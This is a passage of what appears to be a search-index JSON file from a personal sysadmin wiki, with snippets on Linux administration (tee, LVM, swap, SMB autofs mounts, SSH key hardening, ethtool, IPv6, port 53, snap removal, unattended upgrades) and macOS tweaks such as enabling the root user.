"linux/general-snippets/#redirect-output-to-a-file-and-stdout-with-tee", "text": "The command you want is named tee : foo | tee output.file For example, if you only care about stdout: ls -a | tee output.file If you want to include stderr, do: program [ arguments... ] 2 > & 1 | tee outfile 2>&1 redirects channel 2 (stderr/standard error) into channel 1 (stdout/standard output), such that both is written as stdout. It is also directed to the given output file as of the tee command. Furthermore, if you want to append to the log file, use tee -a as: program [ arguments... ] 2 > & 1 | tee -a outfile", "title": "Redirect Output to a File and Stdout With tee"}, {"location": "linux/general-snippets/#add-permanent-path-to-application", "text": "First find the location of the Application/Service: find / -name ApplicationName Go to the path where the application is located cd \"../../../ApplicationName\" Run this command for ZSH: echo 'export PATH=\"' $( pwd ) ':$PATH\"' >> ~/.zshrc && source ~/.zshrc Run this command for \"shell Profile\": echo 'export PATH=\"' $( pwd ) ':$PATH\"' >> ~/.profile && source ~/.profile Run this command for \"shell\": echo 'export PATH=\"' $( pwd ) ':$PATH\"' >> ~/.shellrc && source ~/.shellrc", "title": "Add Permanent Path to Application"}, {"location": "linux/general-snippets/#create-symbolic-links", "text": "To create a symbolic link in Unix/Linux, at the terminal prompt, enter: ln -s source_file target_file to remove symbolic link use the rm command on the link", "title": "Create Symbolic Links"}, {"location": "linux/general-snippets/#open-last-edited-file", "text": "less ` ls -dx1tr /usr/local/cpanel/logs/cpbackup/* | tail -1 `", "title": "Open Last Edited File"}, {"location": "linux/general-snippets/#kill-process-that-runs-more-than-x-time", "text": "Kill cgi after 30 secs: for i in ` ps -eo pid,etime,cmd | grep cgi | awk '$2 > \"00:30\" {print $1}' ` ; do kill $i ; done", "title": "Kill Process That Runs More Than X Time"}, {"location": "linux/locales-time-zone/", "text": "Locales & Timezone \u00b6 Fix Locales (Fix Bash Local Error) \u00b6 Set the Locale, Find the en_US.UTF-8 in the list and select it, at the following screen select it. dpkg-reconfigure locales Set System Time With Time Zone (timedatectl ntp) \u00b6 Find your time zone with timedatectl list-timezones use grep for easier results: timedatectl list-timezones | grep \"Toronto\" The output should look like this: America/Toronto Now set the Time Zone and active it. timedatectl set-timezone Asia/Jerusalem timedatectl set-ntp true Now test timedatectl status timedatectl status Check your system time date", "title": "Locales & Timezone"}, {"location": "linux/locales-time-zone/#locales-timezone", "text": "", "title": "Locales &amp; Timezone"}, {"location": "linux/locales-time-zone/#fix-locales-fix-bash-local-error", "text": "Set the Locale, Find the en_US.UTF-8 in the list and select it, at the following screen select it. dpkg-reconfigure locales", "title": "Fix Locales (Fix Bash Local Error)"}, {"location": "linux/locales-time-zone/#set-system-time-with-time-zone-timedatectl-ntp", "text": "Find your time zone with timedatectl list-timezones use grep for easier results: timedatectl list-timezones | grep \"Toronto\" The output should look like this: America/Toronto Now set the Time Zone and active it. timedatectl set-timezone Asia/Jerusalem timedatectl set-ntp true Now test timedatectl status timedatectl status Check your system time date", "title": "Set System Time With Time Zone (timedatectl ntp)"}, {"location": "linux/lvm-partitions/", "text": "LVM Partitions \u00b6 Removing LVM Partition and Merging In To / (root partition) \u00b6 Find out the names of the partition with df df You need to unmount the partition before you can delete them and marge backup the data of the partition you would like to delete this exmaple will use \"centos-home\" as the partition that will be merged to the root partition. unmount -a lvremove /dev/mapper/centos-home lvextend -l +100%FREE -r /dev/mapper/centos-root After the merging and before mounting you should remove the partition from fastab nano /etc/fstab mount -a", "title": "LVM Partitions"}, {"location": "linux/lvm-partitions/#lvm-partitions", "text": "", "title": "LVM Partitions"}, {"location": "linux/lvm-partitions/#removing-lvm-partition-and-merging-in-to-root-partition", "text": "Find out the names of the partition with df df You need to unmount the partition before you can delete them and marge backup the data of the partition you would like to delete this exmaple will use \"centos-home\" as the partition that will be merged to the root partition. unmount -a lvremove /dev/mapper/centos-home lvextend -l +100%FREE -r /dev/mapper/centos-root After the merging and before mounting you should remove the partition from fastab nano /etc/fstab mount -a", "title": "Removing LVM Partition and Merging In To / (root partition)"}, {"location": "linux/memory-swap/", "text": "Memory & Swap \u00b6 Who Uses RAM \u00b6 ps aux | awk '{print $6/1024 \" MB\\t\\t\" $11}' | sort -n Who Is Using Swap Memory \u00b6 grep VmSwap /proc/*/status 2 >/dev/null | sort -nk2 | tail -n5 Clear Cache and Swap \u00b6 echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a", "title": "Memory & Swap"}, {"location": "linux/memory-swap/#memory-swap", "text": "", "title": "Memory &amp; Swap"}, {"location": "linux/memory-swap/#who-uses-ram", "text": "ps aux | awk '{print $6/1024 \" MB\\t\\t\" $11}' | sort -n", "title": "Who Uses RAM"}, {"location": "linux/memory-swap/#who-is-using-swap-memory", "text": "grep VmSwap /proc/*/status 2 >/dev/null | sort -nk2 | tail -n5", "title": "Who Is Using Swap Memory"}, {"location": "linux/memory-swap/#clear-cache-and-swap", "text": "echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a", "title": "Clear Cache and Swap"}, {"location": "linux/smb-mount-autofs/", "tags": ["smb", "share", "autofs", "mount"], "text": "SMB Mount With autofs \u00b6 Install autofs cifs-utils apt install -y autofs cifs-utils Eddit auto.cifs file nano /etc/auto.cifs Add this to the file: (\"media\" - is any name for your mount) media -fstype = cifs,rw,noperm,vers = 3 .0,credentials = /etc/.credentials.txt ://oscar.3os.re/active-share/media Create credentials file nano /etc/.credentials.txt Add you credentials for the smb mount: username = YourUser password = YourPassword Exit and save: nano /etc/auto.master At the end of the file add: (\"/mnt\" - mount location, /etc/auto.cifs your config for mounting the SMB Share) /mnt /etc/auto.cifs --timeout = 600 --ghost Save end exit. Test the mounting. systemctl start autofs cd /mnt/media/ ls You should see the mount over there. Enable autofs on boot: systemctl enable autofs SMB Mount on Linux With Credentials \u00b6 sudo apt-get install cifs-utils nano ~/.smbcredentials add this to the config. username = msusername password = mspassword Save the file, exit the editor. Change the permissions of the file to prevent unwanted access to your credentials: chmod 600 ~/.smbcredentials Then edit your /etc/fstab file (with root privileges) to add this line (replacing the insecure line in the example above, if you added it): //servername/sharename /media/windowsshare cifs vers = 1 .0,credentials = /home/ubuntuusername/.smbcredentials,iocharset = utf8,sec = ntlm 0 0 Save the file, exit the editor. Finally, test the fstab entry by issuing: sudo mount -a If there are no errors, you should test how it works after a reboot. Your remote share should mount automatically.", "title": "SMB Mount With autofs"}, {"location": "linux/smb-mount-autofs/#smb-mount-with-autofs", "text": "Install autofs cifs-utils apt install -y autofs cifs-utils Eddit auto.cifs file nano /etc/auto.cifs Add this to the file: (\"media\" - is any name for your mount) media -fstype = cifs,rw,noperm,vers = 3 .0,credentials = /etc/.credentials.txt ://oscar.3os.re/active-share/media Create credentials file nano /etc/.credentials.txt Add you credentials for the smb mount: username = YourUser password = YourPassword Exit and save: nano /etc/auto.master At the end of the file add: (\"/mnt\" - mount location, /etc/auto.cifs your config for mounting the SMB Share) /mnt /etc/auto.cifs --timeout = 600 --ghost Save end exit. Test the mounting. systemctl start autofs cd /mnt/media/ ls You should see the mount over there. Enable autofs on boot: systemctl enable autofs", "title": "SMB Mount With autofs"}, {"location": "linux/smb-mount-autofs/#smb-mount-on-linux-with-credentials", "text": "sudo apt-get install cifs-utils nano ~/.smbcredentials add this to the config. username = msusername password = mspassword Save the file, exit the editor. Change the permissions of the file to prevent unwanted access to your credentials: chmod 600 ~/.smbcredentials Then edit your /etc/fstab file (with root privileges) to add this line (replacing the insecure line in the example above, if you added it): //servername/sharename /media/windowsshare cifs vers = 1 .0,credentials = /home/ubuntuusername/.smbcredentials,iocharset = utf8,sec = ntlm 0 0 Save the file, exit the editor. Finally, test the fstab entry by issuing: sudo mount -a If there are no errors, you should test how it works after a reboot. Your remote share should mount automatically.", "title": "SMB Mount on Linux With Credentials"}, {"location": "linux/ssh-hardening-with-rsa-keys/", "text": "SSH Hardening with RSA Keys \u00b6 Generating a new SSH key \u00b6 RSA 4096 ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\" Ed25519 Algorithm ssh-keygen -t ed25519 -C \"your_email@example.com\" Automatic Copy RSA Key to The Server \u00b6 ssh-copy-id -i ~/.ssh/id_rsa.pub user@host Manually Copy RSA Key to The Server \u00b6 ssh to the host ( do not close this connection ) mkdir -p ~/.ssh && touch .ssh/authorized_keys copy your public key usually located at ~/.ssh/id_rsa.pub echo PUCLICK_Key_STRING >> ~/.ssh/authorized_keys SSH Hardening - Disable Password Login \u00b6 edit /etc/ssh/sshd_config change: #PasswordAuthentication yes to PasswordAuthentication no save&exit restart ssh service: sudo systemctl restart ssh Danger Open new SSH season and test login with RSA Keys before closing the existing connection Optional: change ssh port \u00b6 edit /etc/ssh/sshd_config change the port to a desired one port 1337 save&exit restart ssh service: sudo systemctl restart ssh Add Privet id_rsa key to Server \u00b6 copy the id_rsa key to ~/.ssh folder cd ~/.ssh sudo ssh-agent bash ssh-add id_rsa", "title": "SSH Hardening with RSA Keys"}, {"location": "linux/ssh-hardening-with-rsa-keys/#ssh-hardening-with-rsa-keys", "text": "", "title": "SSH Hardening with RSA Keys"}, {"location": "linux/ssh-hardening-with-rsa-keys/#generating-a-new-ssh-key", "text": "RSA 4096 ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\" Ed25519 Algorithm ssh-keygen -t ed25519 -C \"your_email@example.com\"", "title": "Generating a new SSH key"}, {"location": "linux/ssh-hardening-with-rsa-keys/#automatic-copy-rsa-key-to-the-server", "text": "ssh-copy-id -i ~/.ssh/id_rsa.pub user@host", "title": "Automatic Copy RSA Key to The Server"}, {"location": "linux/ssh-hardening-with-rsa-keys/#manually-copy-rsa-key-to-the-server", "text": "ssh to the host ( do not close this connection ) mkdir -p ~/.ssh && touch .ssh/authorized_keys copy your public key usually located at ~/.ssh/id_rsa.pub echo PUCLICK_Key_STRING >> ~/.ssh/authorized_keys", "title": "Manually Copy RSA Key to The Server"}, {"location": "linux/ssh-hardening-with-rsa-keys/#ssh-hardening-disable-password-login", "text": "edit /etc/ssh/sshd_config change: #PasswordAuthentication yes to PasswordAuthentication no save&exit restart ssh service: sudo systemctl restart ssh Danger Open new SSH season and test login with RSA Keys before closing the existing connection", "title": "SSH Hardening - Disable Password Login"}, {"location": "linux/ssh-hardening-with-rsa-keys/#optional-change-ssh-port", "text": "edit /etc/ssh/sshd_config change the port to a desired one port 1337 save&exit restart ssh service: sudo systemctl restart ssh", "title": "Optional: change ssh port"}, {"location": "linux/ssh-hardening-with-rsa-keys/#add-privet-id_rsa-key-to-server", "text": "copy the id_rsa key to ~/.ssh folder cd ~/.ssh sudo ssh-agent bash ssh-add id_rsa", "title": "Add Privet id_rsa key to Server"}, {"location": "linux/Network/identify-nics/", "tags": ["linux", "network"], "text": "Identify Physical Network Interfaces \u00b6 The Problem \u00b6 Servers usually have a number of physical network interfaces. The network interfaces names in linux host usually won't tell you much about the which physical network interface corresponds to the interface name. Therefor, it creates a problem when you want to use a specific network interface for a specific purpose but you don't know which physical network interface corresponds to the interface name. The Solution \u00b6 ethtool tool can be used to identify the physical network interface corresponding to a network interface name. For this method to work, you need a physical access to host's network cards and the physical network interfaces should have Led indicator lights. Note This functionality of ethtool may not be supported by all server or network card hardware. ethtool usually isn't installed by default on a linux host. You can install it by running the following command (debian example): apt install ethtool Find the network interfaces present on the host and run the following command for each network interface: ip addr or ifconfig -a Now you can use the ethtool command to identify the physical network interface corresponding to the network interface name. Example for eth0 network interface name: ethtool --identify eth0 This command will run untill you stop it. When it's running, you should see the LED indicator light blinking (usually orange) on the physical network interface corresponding to the network interface name. To get information about the hardware capabilities of the network interface: ethtool eth0 output example: ethtool enp12s0f4 Settings for enp12s0f4: Supported ports: [ FIBRE ] Supported link modes: 1000baseT/Full 10000baseT/Full Supported pause frame use: Symmetric Receive-only Supports auto-negotiation: No Supported FEC modes: None Advertised link modes: 10000baseT/Full Advertised pause frame use: Symmetric Advertised auto-negotiation: No Advertised FEC modes: None Link partner advertised link modes: Not reported Link partner advertised pause frame use: Symmetric Link partner advertised auto-negotiation: No Link partner advertised FEC modes: None Speed: 10000Mb/s Duplex: Full Auto-negotiation: off Port: Direct Attach Copper PHYAD: 255 Transceiver: internal Current message level: 0x000000ff ( 255 ) drv probe link timer ifdown ifup rx_err tx_err Link detected: yes", "title": "Identify Network Interfaces"}, {"location": "linux/Network/identify-nics/#identify-physical-network-interfaces", "text": "", "title": "Identify Physical Network Interfaces"}, {"location": "linux/Network/identify-nics/#the-problem", "text": "Servers usually have a number of physical network interfaces. The network interfaces names in linux host usually won't tell you much about the which physical network interface corresponds to the interface name. Therefor, it creates a problem when you want to use a specific network interface for a specific purpose but you don't know which physical network interface corresponds to the interface name.", "title": "The Problem"}, {"location": "linux/Network/identify-nics/#the-solution", "text": "ethtool tool can be used to identify the physical network interface corresponding to a network interface name. For this method to work, you need a physical access to host's network cards and the physical network interfaces should have Led indicator lights. Note This functionality of ethtool may not be supported by all server or network card hardware. ethtool usually isn't installed by default on a linux host. You can install it by running the following command (debian example): apt install ethtool Find the network interfaces present on the host and run the following command for each network interface: ip addr or ifconfig -a Now you can use the ethtool command to identify the physical network interface corresponding to the network interface name. Example for eth0 network interface name: ethtool --identify eth0 This command will run untill you stop it. When it's running, you should see the LED indicator light blinking (usually orange) on the physical network interface corresponding to the network interface name. To get information about the hardware capabilities of the network interface: ethtool eth0 output example: ethtool enp12s0f4 Settings for enp12s0f4: Supported ports: [ FIBRE ] Supported link modes: 1000baseT/Full 10000baseT/Full Supported pause frame use: Symmetric Receive-only Supports auto-negotiation: No Supported FEC modes: None Advertised link modes: 10000baseT/Full Advertised pause frame use: Symmetric Advertised auto-negotiation: No Advertised FEC modes: None Link partner advertised link modes: Not reported Link partner advertised pause frame use: Symmetric Link partner advertised auto-negotiation: No Link partner advertised FEC modes: None Speed: 10000Mb/s Duplex: Full Auto-negotiation: off Port: Direct Attach Copper PHYAD: 255 Transceiver: internal Current message level: 0x000000ff ( 255 ) drv probe link timer ifdown ifup rx_err tx_err Link detected: yes", "title": "The Solution"}, {"location": "linux/ubuntu-debian/disable-ipv6/", "tags": ["ubuntu", "debian", "ipv6"], "text": "Disable IPv6 on Ubuntu and Debian Linux Permanently \u00b6 By default, Ubuntu/Debian IPv6 is enabled after installation. This means that the IPv6 stack is active and the host can communicate with other hosts on the same network via IPv6 protocol. You can disable Ubuntu/Debian by editing the /etc/default/grub file. nano /etc/default/grub add ipv6.disable=1 to the end of GRUB_CMDLINE_LINUX_DEFAULT and GRUB_CMDLINE_LINUX line. Don't change the other values at those lines. GRUB_CMDLINE_LINUX_DEFAULT = \"ipv6.disable=1\" GRUB_CMDLINE_LINUX = \"ipv6.disable=1\" The config should look like this: Update the grub configuration. update-grub Save and exit. Reboot to apply the changes.", "title": "Disable IPv6"}, {"location": "linux/ubuntu-debian/disable-ipv6/#disable-ipv6-on-ubuntu-and-debian-linux-permanently", "text": "By default, Ubuntu/Debian IPv6 is enabled after installation. This means that the IPv6 stack is active and the host can communicate with other hosts on the same network via IPv6 protocol. You can disable Ubuntu/Debian by editing the /etc/default/grub file. nano /etc/default/grub add ipv6.disable=1 to the end of GRUB_CMDLINE_LINUX_DEFAULT and GRUB_CMDLINE_LINUX line. Don't change the other values at those lines. GRUB_CMDLINE_LINUX_DEFAULT = \"ipv6.disable=1\" GRUB_CMDLINE_LINUX = \"ipv6.disable=1\" The config should look like this: Update the grub configuration. update-grub Save and exit. Reboot to apply the changes.", "title": "Disable IPv6 on Ubuntu and Debian Linux Permanently"}, {"location": "linux/ubuntu-debian/free-port-53/", "tags": ["Ubuntu", "dns"], "text": "Free Port 53 on Ubuntu \u00b6 What's Using Port 53? \u00b6 When you install Ubuntu (in my case its Server version). It uses systemd-resolved as internal DNS Forwarder. systemd-resolved is a system service that provides network name resolution to local applications. It implements a caching and validating DNS/DNSSEC stub resolver, as well as an LLMNR resolver and responder. How to Free Port 53 on Ubuntu \u00b6 If we want to use port 53 for other purposes, we need to free it for example a Pihole DNS server. We can do it with the following commands: sudo sed -r -i.orig 's/#?DNSStubListener=yes/DNSStubListener=no/g' /etc/systemd/resolved.conf sudo sh -c 'rm /etc/resolv.conf && ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf' sudo systemctl restart systemd-resolved", "title": "Free Port 53 on Ubuntu"}, {"location": "linux/ubuntu-debian/free-port-53/#free-port-53-on-ubuntu", "text": "", "title": "Free Port 53 on Ubuntu"}, {"location": "linux/ubuntu-debian/free-port-53/#whats-using-port-53", "text": "When you install Ubuntu (in my case its Server version). It uses systemd-resolved as internal DNS Forwarder. systemd-resolved is a system service that provides network name resolution to local applications. It implements a caching and validating DNS/DNSSEC stub resolver, as well as an LLMNR resolver and responder.", "title": "What's Using Port 53?"}, {"location": "linux/ubuntu-debian/free-port-53/#how-to-free-port-53-on-ubuntu", "text": "If we want to use port 53 for other purposes, we need to free it for example a Pihole DNS server. We can do it with the following commands: sudo sed -r -i.orig 's/#?DNSStubListener=yes/DNSStubListener=no/g' /etc/systemd/resolved.conf sudo sh -c 'rm /etc/resolv.conf && ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf' sudo systemctl restart systemd-resolved", "title": "How to Free Port 53 on Ubuntu"}, {"location": "linux/ubuntu-debian/remove-snap-store/", "tags": ["ubuntu"], "text": "Remove Snap Store from Ubuntu \u00b6 What Is Snap? \u00b6 Snap is a cross-platform packaging and deployment system developed by Canonical, the makers of Ubuntu, for the Linux platform. It's compatible with most major Linux distros, including Ubuntu, Debian, Arch Linux, Fedora, CentOS, and Manjaro. How To Remove Snap Store \u00b6 sudo rm -rf /var/cache/snapd/ sudo apt autoremove --purge snapd gnome-software-plugin-snap sudo rm -rf ~/snap", "title": "Remove Snap Store"}, {"location": "linux/ubuntu-debian/remove-snap-store/#remove-snap-store-from-ubuntu", "text": "", "title": "Remove Snap Store from Ubuntu"}, {"location": "linux/ubuntu-debian/remove-snap-store/#what-is-snap", "text": "Snap is a cross-platform packaging and deployment system developed by Canonical, the makers of Ubuntu, for the Linux platform. It's compatible with most major Linux distros, including Ubuntu, Debian, Arch Linux, Fedora, CentOS, and Manjaro.", "title": "What Is Snap?"}, {"location": "linux/ubuntu-debian/remove-snap-store/#how-to-remove-snap-store", "text": "sudo rm -rf /var/cache/snapd/ sudo apt autoremove --purge snapd gnome-software-plugin-snap sudo rm -rf ~/snap", "title": "How To Remove Snap Store"}, {"location": "linux/ubuntu-debian/unattended-upgrades/", "text": "Unattended Upgrades \u00b6 sudo apt install -y unattended-upgrades apt-listchanges Edit the config to your preference sudo nano /etc/apt/apt.conf.d/50unattended-upgrades Example Ubuntu Debian/RaspberyOS Unattended-Upgrade::Allowed-Origins { \"${distro_id}:${distro_codename}\"; \"${distro_id}:${distro_codename}-security\"; // Extended Security Maintenance; doesn't necessarily exist for // every release and this system may not have it installed, but if // available, the policy for updates is such that unattended-upgrades // should also install from here by default. \"${distro_id}ESMApps:${distro_codename}-apps-security\"; \"${distro_id}ESM:${distro_codename}-infra-security\"; \"${distro_id}:${distro_codename}-updates\"; \"${distro_id}:${distro_codename}-proposed\"; // \"${distro_id}:${distro_codename}-backports\"; }; Unattended-Upgrade::DevRelease \"auto\"; Unattended-Upgrade::AutoFixInterruptedDpkg \"true\"; Unattended-Upgrade::MinimalSteps \"true\"; Unattended-Upgrade::InstallOnShutdown \"false\"; //Unattended-Upgrade::Mail \"\"; //Unattended-Upgrade::MailReport \"on-change\"; Unattended-Upgrade::Remove-Unused-Kernel-Packages \"true\"; Unattended-Upgrade::Remove-New-Unused-Dependencies \"true\"; Unattended-Upgrade::Remove-Unused-Dependencies \"true\"; Unattended-Upgrade::Automatic-Reboot \"true\"; Unattended-Upgrade::Automatic-Reboot-WithUsers \"true\"; Unattended-Upgrade::Automatic-Reboot-Time \"06:00\"; //Acquire::http::Dl-Limit \"70\"; // Unattended-Upgrade::SyslogEnable \"false\"; // Unattended-Upgrade::SyslogFacility \"daemon\"; // Unattended-Upgrade::OnlyOnACPower \"true\"; // Unattended-Upgrade::Skip-Updates-On-Metered-Connections \"true\"; // Unattended-Upgrade::Verbose \"false\"; // Unattended-Upgrade::Debug \"false\"; // Unattended-Upgrade::Allow-downgrade \"false\"; Unattended-Upgrade::Origins-Pattern { // Codename based matching: // This will follow the migration of a release through different // archives (e.g. from testing to stable and later oldstable). // Software will be the latest available for the named release, // but the Debian release itself will not be automatically upgraded. \"origin=Debian,codename=${distro_codename}-updates\"; // \"origin=Debian,codename=${distro_codename}-proposed-updates\"; \"origin=Debian,codename=${distro_codename},label=Debian\"; \"origin=Debian,codename=${distro_codename},label=Debian-Security\"; // Archive or Suite based matching: // Note that this will silently match a different release after // migration to the specified archive (e.g. testing becomes the // new stable). // \"o=Debian,a=stable\"; // \"o=Debian,a=stable-updates\"; // \"o=Debian,a=proposed-updates\"; // \"o=Debian Backports,a=${distro_codename}-backports,l=Debian Backports\"; }; Unattended-Upgrade::DevRelease \"auto\"; Unattended-Upgrade::AutoFixInterruptedDpkg \"true\"; Unattended-Upgrade::MinimalSteps \"true\"; Unattended-Upgrade::InstallOnShutdown \"false\"; //Unattended-Upgrade::Mail \"\"; //Unattended-Upgrade::MailReport \"on-change\"; Unattended-Upgrade::Remove-Unused-Kernel-Packages \"true\"; Unattended-Upgrade::Remove-New-Unused-Dependencies \"true\"; Unattended-Upgrade::Remove-Unused-Dependencies \"true\"; Unattended-Upgrade::Automatic-Reboot \"true\"; Unattended-Upgrade::Automatic-Reboot-WithUsers \"true\"; Unattended-Upgrade::Automatic-Reboot-Time \"06:00\"; // Acquire::http::Dl-Limit \"70\"; // Unattended-Upgrade::SyslogEnable \"false\"; // Unattended-Upgrade::SyslogFacility \"daemon\"; // Unattended-Upgrade::OnlyOnACPower \"true\"; // Unattended-Upgrade::Skip-Updates-On-Metered-Connections \"true\"; // Unattended-Upgrade::Verbose \"false\"; // Unattended-Upgrade::Debug \"false\"; // Unattended-Upgrade::Allow-downgrade \"false\"; Automatic call via /etc/apt/apt.conf.d/20auto-upgrades echo unattended-upgrades unattended-upgrades/enable_auto_updates boolean true | sudo debconf-set-selections sudo dpkg-reconfigure -f noninteractive unattended-upgrades Check the /etc/apt/apt.conf.d/20auto-upgrades for those 2 lines: APT::Periodic::Update-Package-Lists \"1\" ; APT::Periodic::Unattended-Upgrade \"1\" ; Manual Run: sudo unattended-upgrade -d To enable unattended-upgrade use the following command: sudo dpkg-reconfigure --priority = low unattended-upgrades", "title": "Unattended Upgrades"}, {"location": "linux/ubuntu-debian/unattended-upgrades/#unattended-upgrades", "text": "sudo apt install -y unattended-upgrades apt-listchanges Edit the config to your preference sudo nano /etc/apt/apt.conf.d/50unattended-upgrades Example Ubuntu Debian/RaspberyOS Unattended-Upgrade::Allowed-Origins { \"${distro_id}:${distro_codename}\"; \"${distro_id}:${distro_codename}-security\"; // Extended Security Maintenance; doesn't necessarily exist for // every release and this system may not have it installed, but if // available, the policy for updates is such that unattended-upgrades // should also install from here by default. \"${distro_id}ESMApps:${distro_codename}-apps-security\"; \"${distro_id}ESM:${distro_codename}-infra-security\"; \"${distro_id}:${distro_codename}-updates\"; \"${distro_id}:${distro_codename}-proposed\"; // \"${distro_id}:${distro_codename}-backports\"; }; Unattended-Upgrade::DevRelease \"auto\"; Unattended-Upgrade::AutoFixInterruptedDpkg \"true\"; Unattended-Upgrade::MinimalSteps \"true\"; Unattended-Upgrade::InstallOnShutdown \"false\"; //Unattended-Upgrade::Mail \"\"; //Unattended-Upgrade::MailReport \"on-change\"; Unattended-Upgrade::Remove-Unused-Kernel-Packages \"true\"; Unattended-Upgrade::Remove-New-Unused-Dependencies \"true\"; Unattended-Upgrade::Remove-Unused-Dependencies \"true\"; Unattended-Upgrade::Automatic-Reboot \"true\"; Unattended-Upgrade::Automatic-Reboot-WithUsers \"true\"; Unattended-Upgrade::Automatic-Reboot-Time \"06:00\"; //Acquire::http::Dl-Limit \"70\"; // Unattended-Upgrade::SyslogEnable \"false\"; // Unattended-Upgrade::SyslogFacility \"daemon\"; // Unattended-Upgrade::OnlyOnACPower \"true\"; // Unattended-Upgrade::Skip-Updates-On-Metered-Connections \"true\"; // Unattended-Upgrade::Verbose \"false\"; // Unattended-Upgrade::Debug \"false\"; // Unattended-Upgrade::Allow-downgrade \"false\"; Unattended-Upgrade::Origins-Pattern { // Codename based matching: // This will follow the migration of a release through different // archives (e.g. from testing to stable and later oldstable). // Software will be the latest available for the named release, // but the Debian release itself will not be automatically upgraded. \"origin=Debian,codename=${distro_codename}-updates\"; // \"origin=Debian,codename=${distro_codename}-proposed-updates\"; \"origin=Debian,codename=${distro_codename},label=Debian\"; \"origin=Debian,codename=${distro_codename},label=Debian-Security\"; // Archive or Suite based matching: // Note that this will silently match a different release after // migration to the specified archive (e.g. testing becomes the // new stable). // \"o=Debian,a=stable\"; // \"o=Debian,a=stable-updates\"; // \"o=Debian,a=proposed-updates\"; // \"o=Debian Backports,a=${distro_codename}-backports,l=Debian Backports\"; }; Unattended-Upgrade::DevRelease \"auto\"; Unattended-Upgrade::AutoFixInterruptedDpkg \"true\"; Unattended-Upgrade::MinimalSteps \"true\"; Unattended-Upgrade::InstallOnShutdown \"false\"; //Unattended-Upgrade::Mail \"\"; //Unattended-Upgrade::MailReport \"on-change\"; Unattended-Upgrade::Remove-Unused-Kernel-Packages \"true\"; Unattended-Upgrade::Remove-New-Unused-Dependencies \"true\"; Unattended-Upgrade::Remove-Unused-Dependencies \"true\"; Unattended-Upgrade::Automatic-Reboot \"true\"; Unattended-Upgrade::Automatic-Reboot-WithUsers \"true\"; Unattended-Upgrade::Automatic-Reboot-Time \"06:00\"; // Acquire::http::Dl-Limit \"70\"; // Unattended-Upgrade::SyslogEnable \"false\"; // Unattended-Upgrade::SyslogFacility \"daemon\"; // Unattended-Upgrade::OnlyOnACPower \"true\"; // Unattended-Upgrade::Skip-Updates-On-Metered-Connections \"true\"; // Unattended-Upgrade::Verbose \"false\"; // Unattended-Upgrade::Debug \"false\"; // Unattended-Upgrade::Allow-downgrade \"false\"; Automatic call via /etc/apt/apt.conf.d/20auto-upgrades echo unattended-upgrades unattended-upgrades/enable_auto_updates boolean true | sudo debconf-set-selections sudo dpkg-reconfigure -f noninteractive unattended-upgrades Check the /etc/apt/apt.conf.d/20auto-upgrades for those 2 lines: APT::Periodic::Update-Package-Lists \"1\" ; APT::Periodic::Unattended-Upgrade \"1\" ; Manual Run: sudo unattended-upgrade -d To enable unattended-upgrade use the following command: sudo dpkg-reconfigure --priority = low unattended-upgrades", "title": "Unattended Upgrades"}, {"location": "mac-os/applications-tweaks/", "tags": ["macOS"], "text": "Applications Tweaks \u00b6 Running Multi Instances of an Application \u00b6 Launch the Script Editor choose temporary folder Copy the command to be executed to the Script Editor do shell script \"open -n <path to application>\" Example do shell script \"open -n /Applications/'Visual Studio Code.app'\" File > Export Use the following settings: Export As: Your New Application Name Where: Applications File Format: Application Change The Icon of Your New Application: In Finder got to Applications folder. Right Click on the new Your New Application application we just created and click Get Info . Drug the original application icon (or any other) to the in the left corner of the \"get info\" menu. Lunch Firefox Profile Manager as Application \u00b6 Launch the Script Editor choose temporary folder Copy the command to be executed to the Script Editor do shell script \"/Applications/Firefox.app/Contents/MacOS/firefox -ProfileManager &> /dev/null &\" File > Export Use the following settings: Save As: Firefox Profile Manager Where: Applications File Format: Application Change The Icon of Your New Firefox Profile Manager Application: In Finder got to Applications folder. Right Click on the new Firefox Profile Manager application we just created and click Get Info . Drug the original application to the icon in the left corner of the \"get info\" menu.", "title": "Applications Tweaks"}, {"location": "mac-os/applications-tweaks/#applications-tweaks", "text": "", "title": "Applications Tweaks"}, {"location": "mac-os/applications-tweaks/#running-multi-instances-of-an-application", "text": "Launch the Script Editor choose temporary folder Copy the command to be executed to the Script Editor do shell script \"open -n <path to application>\" Example do shell script \"open -n /Applications/'Visual Studio Code.app'\" File > Export Use the following settings: Export As: Your New Application Name Where: Applications File Format: Application Change The Icon of Your New Application: In Finder got to Applications folder. Right Click on the new Your New Application application we just created and click Get Info . Drug the original application icon (or any other) to the in the left corner of the \"get info\" menu.", "title": "Running Multi Instances of an Application"}, {"location": "mac-os/applications-tweaks/#lunch-firefox-profile-manager-as-application", "text": "Launch the Script Editor choose temporary folder Copy the command to be executed to the Script Editor do shell script \"/Applications/Firefox.app/Contents/MacOS/firefox -ProfileManager &> /dev/null &\" File > Export Use the following settings: Save As: Firefox Profile Manager Where: Applications File Format: Application Change The Icon of Your New Firefox Profile Manager Application: In Finder got to Applications folder. Right Click on the new Firefox Profile Manager application we just created and click Get Info . Drug the original application to the icon in the left corner of the \"get info\" menu.", "title": "Lunch Firefox Profile Manager as Application"}, {"location": "mac-os/enable-root-user/", "tags": ["macOS"], "text": "Enable or Disable the Root User on macOS \u00b6 Mac administrators can use the root user account to perform tasks that require access to more areas of the system. The user account named \u201droot\u201d is a superuser with read and write privileges to more areas of the system, including files in other macOS user accounts. The root user is disabled by default. If you can log in to your Mac with an administrator account, you can enable the root user, then log in as the root user to complete your task. How to Enable the Root User \u00b6 System Preferences > Users & Groups Click lock icon, enter an administrator name and password. Click Login Options . Click Join at Newotk Account Server . Click Open Directory Utility . Click lock icon in the Directory Utility window, then enter an administrator name and password. From the menu bar in Directory Utility: Choose Edit > Enable Root User, then enter the password that you want to use for the root user. Or choose Edit > Disable Root User. How to Disable the Root User \u00b6 To Disable the Root User repeat the steps above, but change the last step to Disable Root User. Login as The Root User \u00b6 When the root user is enabled, you have the privileges of the root user only while logged in as the root user. Logout of your current account, then log in as the root user. user name \u201droot\u201d and the password you created for the root user.", "title": "Enable Root User"}, {"location": "mac-os/enable-root-user/#enable-or-disable-the-root-user-on-macos", "text": "Mac administrators can use the root user account to perform tasks that require access to more areas of the system. The user account named \u201droot\u201d is a superuser with read and write privileges to more areas of the system, including files in other macOS user accounts. The root user is disabled by default. If you can log in to your 